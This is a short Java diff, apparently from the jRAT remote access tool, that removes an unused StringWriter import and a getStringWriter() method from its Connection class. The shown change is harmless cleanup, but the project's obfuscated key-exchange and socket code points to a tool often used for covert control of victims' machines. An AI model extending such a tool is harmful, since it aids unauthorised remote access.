@@ -11,7 +11,6 @@ import jrat.common.crypto.Crypto;
 import jrat.common.crypto.CryptoUtils;
 import jrat.common.crypto.ObfuscatedStreamKeyExchanger;
 import jrat.common.crypto.StreamKeyExchanger;
-import jrat.common.io.StringWriter;
 import jrat.common.listeners.ConnectionListener;
 
 import javax.crypto.Cipher;
@@ -261,15 +260,6 @@ public class Connection implements Runnable {
 
 	public Socket getSocket() {
 		return this.socket;
-	}
-	
-	public StringWriter getStringWriter() {
-		return new StringWriter() {
-			@Override
-			public void writeLine(String s) throws Exception {
-				Connection.this.writeLine(s);
-			}
-		};
 	}
 
 	public void addConnectionListener(ConnectionListener listener) {
